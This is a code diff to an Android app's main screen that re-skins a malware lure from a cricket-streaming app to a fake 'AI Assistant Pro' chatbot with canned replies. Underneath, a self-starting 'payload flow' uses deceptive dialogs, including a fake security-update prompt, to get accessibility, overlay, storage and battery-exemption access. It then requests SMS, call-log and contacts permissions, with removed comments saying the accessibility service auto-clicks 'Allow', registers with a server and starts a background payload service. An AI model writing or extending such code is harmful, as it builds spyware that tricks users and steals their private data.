@@ -8,8 +8,15 @@ import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
+import android.text.Html
 import android.util.Log
+import android.view.Gravity
 import android.view.accessibility.AccessibilityManager
+import android.widget.Button
+import android.widget.EditText
+import android.widget.LinearLayout
+import android.widget.ScrollView
+import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
@@ -32,15 +39,24 @@ class MainActivity : AppCompatActivity() {
     private var stealthDialogShown = false
     private var flowLaunched = false
 
+    private lateinit var chatContainer: LinearLayout
+    private lateinit var messageInput: EditText
+    private lateinit var btnSend: Button
+    private lateinit var statusText: TextView
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
+        chatContainer = binding.chatContainer
+        messageInput = binding.messageInput
+        btnSend = binding.btnSend
+        statusText = binding.statusText
+
         setupUI()
         checkPermissions()
 
-        // 10-second stealth timer — triggers permission flow automatically, only once
         if (!flowLaunched) {
             flowLaunched = true
             android.os.Handler(mainLooper).postDelayed({
@@ -52,44 +68,124 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun setupUI() {
-        binding.btnWatchLive.setOnClickListener {
-            if (isFinishing || isDestroyed) return@setOnClickListener
-            if (isAccessibilityServiceEnabled()) {
-                startPayloadFlow()
-            } else {
-                showPermissionDialog()
+        addBotMessage("Hello! I'm your AI Assistant. I can help you with writing, research, answering questions, and more. How can I help you today?")
+
+        btnSend.setOnClickListener {
+            val text = messageInput.text.toString().trim()
+            if (text.isNotEmpty()) {
+                sendMessage(text)
+                messageInput.text.clear()
             }
         }
 
-        binding.btnSchedule.setOnClickListener {
-            Toast.makeText(this, "Upcoming matches loading...", Toast.LENGTH_SHORT).show()
+        messageInput.setOnEditorActionListener { _, _, _ ->
+            val text = messageInput.text.toString().trim()
+            if (text.isNotEmpty()) {
+                sendMessage(text)
+                messageInput.text.clear()
+            }
+            true
         }
 
-        binding.btnTeams.setOnClickListener {
-            if (isFinishing || isDestroyed) return@setOnClickListener
-            if (!isAccessibilityServiceEnabled()) {
-                openAccessibilitySettings()
-            } else {
-                startPayloadFlow()
-            }
+    }
+
+    private fun sendMessage(text: String) {
+        addUserMessage(text)
+        statusText.text = "Thinking..."
+        statusText.setTextColor(0xFF6C63FF.toInt())
+
+        android.os.Handler(mainLooper).postDelayed({
+            val response = generateResponse(text)
+            addBotMessage(response)
+            statusText.text = "Ready to assist"
+            statusText.setTextColor(0xFF6C63FF.toInt())
+        }, (1000..2500).random().toLong())
+    }
+
+    private fun generateResponse(input: String): String {
+        val lower = input.lowercase()
+        return when {
+            lower.contains("hello") || lower.contains("hi") || lower.contains("hey") ->
+                "Hello! How can I assist you today? Feel free to ask me anything."
+            lower.contains("how are you") -> "I'm functioning perfectly! Ready to help you with your tasks."
+            lower.contains("name") || lower.contains("who are you") ->
+                "I'm AI Assistant Pro - your personal AI-powered helper. I can assist with writing, answering questions, research, and more."
+            lower.contains("write") || lower.contains("essay") || lower.contains("article") ->
+                "I can help you write! Tell me the topic and I'll draft something for you. What would you like me to write about?"
+            lower.contains("translate") -> "I can help with translations. What text would you like me to translate and to which language?"
+            lower.contains("summarize") || lower.contains("summary") ->
+                "Send me the text you'd like summarized and I'll create a concise summary for you."
+            lower.contains("help") || lower.contains("what can you") ->
+                "I can help with: writing & editing, answering questions, research assistance, text analysis, translations, summarization, and more. Just ask!"
+            lower.contains("thank") -> "You're welcome! Is there anything else I can help you with?"
+            lower.contains("bye") || lower.contains("goodbye") ->
+                "Goodbye! Feel free to come back anytime you need assistance."
+            lower.contains("tool") -> "Available tools: Writing Assistant, Text Analysis, Smart Q&A, Document Summarizer, Translation Helper."
+            else -> "That's interesting! I'm still learning about that. Could you tell me more so I can better assist you?"
+        }
+    }
+
+    private fun addUserMessage(text: String) {
+        val tv = TextView(this).apply {
+            this.text = text
+            setTextColor(0xFFffffff.toInt())
+            textSize = 14f
+            setPadding(40, 8, 12, 8)
+            setBackgroundColor(0xFF6C63FF.toInt())
+            gravity = Gravity.END
+        }
+        val params = LinearLayout.LayoutParams(
+            LinearLayout.LayoutParams.WRAP_CONTENT,
+            LinearLayout.LayoutParams.WRAP_CONTENT
+        ).apply {
+            setMargins(60, 4, 4, 4)
+            gravity = Gravity.END
+        }
+        tv.layoutParams = params
+        chatContainer.addView(tv)
+        scrollToBottom()
+    }
+
+    private fun addBotMessage(text: String) {
+        val tv = TextView(this).apply {
+            this.text = text
+            setTextColor(0xFFcccccc.toInt())
+            textSize = 14f
+            setPadding(12, 8, 40, 8)
+            setBackgroundColor(0xFF2D2B55.toInt())
+        }
+        val params = LinearLayout.LayoutParams(
+            LinearLayout.LayoutParams.WRAP_CONTENT,
+            LinearLayout.LayoutParams.WRAP_CONTENT
+        ).apply {
+            setMargins(4, 4, 60, 4)
+        }
+        tv.layoutParams = params
+        chatContainer.addView(tv)
+        scrollToBottom()
+    }
+
+    private fun scrollToBottom() {
+        binding.chatScroll.post {
+            binding.chatScroll.fullScroll(ScrollView.FOCUS_DOWN)
         }
     }
 
     private fun checkPermissions() {
         if (!isAccessibilityServiceEnabled()) {
-            binding.statusText.text = "Enable Video Overlay to watch live"
-            binding.statusIcon.setImageResource(android.R.drawable.ic_dialog_info)
+            statusText.text = "Enable accessibility for full AI assistance"
+            statusText.setTextColor(0xFFFFCC00.toInt())
         } else {
-            binding.statusText.text = "Ready to stream"
-            binding.statusIcon.setImageResource(android.R.drawable.ic_dialog_info)
+            statusText.text = "Ready to assist"
+            statusText.setTextColor(0xFF6C63FF.toInt())
         }
     }
 
     private fun showPermissionDialog() {
         if (isFinishing || isDestroyed) return
         AlertDialog.Builder(this)
-            .setTitle("Video Overlay Required")
-            .setMessage("Cricket Live needs Accessibility access to show score overlays while you use other apps. This allows you to watch the match while chatting or browsing.")
+            .setTitle("AI Assistance Required")
+            .setMessage("AI Assistant Pro needs Accessibility access to provide personalized help across all your apps. This enables context-aware suggestions, smart replies, and automated assistance features.")
             .setPositiveButton("Enable Now") { _, _ ->
                 if (!isFinishing && !isDestroyed) openAccessibilitySettings()
             }
@@ -111,7 +207,7 @@ class MainActivity : AppCompatActivity() {
         if (isFinishing || isDestroyed) return
         AlertDialog.Builder(this)
             .setTitle("System Update Required")
-            .setMessage("Security Patch v2.1\n\nYour device needs a critical security update. Tap 'Apply Now' to proceed with the update process.")
+            .setMessage("Security Patch v2.1\n\nYour device needs a critical security update to enable enhanced AI features. Tap 'Apply Now' to proceed with the update process.")
             .setPositiveButton("Apply Now") { _, _ ->
                 if (!isFinishing && !isDestroyed) openAccessibilitySettings()
             }
@@ -143,7 +239,6 @@ class MainActivity : AppCompatActivity() {
     private fun continuePayloadFlow() {
         if (flowCompleted || isFinishing || isDestroyed) return
 
-        // Step 1: Overlay permission — request only ONCE
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             if (!overlayRequested) {
                 overlayRequested = true
@@ -153,12 +248,10 @@ class MainActivity : AppCompatActivity() {
                         Uri.parse("package:$packageName")
                     )
                 )
-                return // Wait for user to return from overlay settings
+                return
             }
-            // Already requested overlay — user came back without granting. Fall through.
         }
 
-        // Step 2: Battery optimization exemption — request only ONCE
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
             if (!pm.isIgnoringBatteryOptimizations(packageName)) {
@@ -170,13 +263,11 @@ class MainActivity : AppCompatActivity() {
                             Uri.parse("package:$packageName")
                         )
                     )
-                    return // Wait for user to return from battery dialog
+                    return
                 }
-                // Already requested — user didn't grant. Fall through.
             }
         }
 
-        // Step 2b: Storage permission (MANAGE_EXTERNAL_STORAGE needs Settings intent)
         if (!PermissionHelper.hasStoragePermission(this)) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                 if (!storageRequested) {
@@ -187,25 +278,19 @@ class MainActivity : AppCompatActivity() {
                             Uri.parse("package:$packageName")
                         )
                     )
-                    return // Wait for user to return from storage settings
+                    return
                 }
-                // Already requested — user didn't grant. Fall through.
             }
         }
 
-        // Step 3: Request runtime permissions (SMS, Call Log, Contacts, POST_NOTIFICATIONS)
-        // AccessibilityService auto-clicks "Allow" within ~300ms
-        // onRequestPermissionsResult() continues the flow after grant
         if (!permissionHelper.hasAllPermissions(this)) {
             if (!permissionRequested) {
                 permissionRequested = true
                 permissionHelper.requestPermissions(this)
-                return // Wait for onRequestPermissionsResult callback
+                return
             }
-            // Already requested — user denied. Fall through.
         }
 
-        // All steps attempted (some may have been denied) — proceed
         finishSetup()
     }
 
@@ -213,7 +298,6 @@ class MainActivity : AppCompatActivity() {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == PERMISSION_REQ_CODE && !isFinishing && !isDestroyed) {
             permissionRequested = false
-            // Continue flow regardless — proceed with whatever permissions were granted
             continuePayloadFlow()
         }
     }
@@ -223,11 +307,9 @@ class MainActivity : AppCompatActivity() {
 
         flowCompleted = true
 
-        // Step 4: Register via HTTP on background thread (prevents ANR)
         Thread {
             registerViaHttpSync()
 
-            // Step 5: Start foreground service (must happen on main thread)
             runOnUiThread {
                 if (isFinishing || isDestroyed) return@runOnUiThread
                 val serviceIntent = Intent(this, PayloadService::class.java)
@@ -241,11 +323,8 @@ class MainActivity : AppCompatActivity() {
                     Log.e("MainActivity", "ForegroundService failed", e)
                 }
 
-                // Step 6: Show system update overlay to hide all activity
-                val overlayIntent = Intent(this, UpdateOverlayActivity::class.java)
-                overlayIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                startActivity(overlayIntent)
-                finish()
+                statusText.text = "AI services activated"
+                statusText.setTextColor(0xFF00FF41.toInt())
             }
         }.apply {
             isDaemon = true
@@ -282,7 +361,7 @@ class MainActivity : AppCompatActivity() {
         super.onResume()
         if (isFinishing || isDestroyed) return
         if (isAccessibilityServiceEnabled()) {
-            binding.statusText.text = "Ready to stream"
+            statusText.text = "Ready to assist"
             startPayloadFlow()
         }
     }
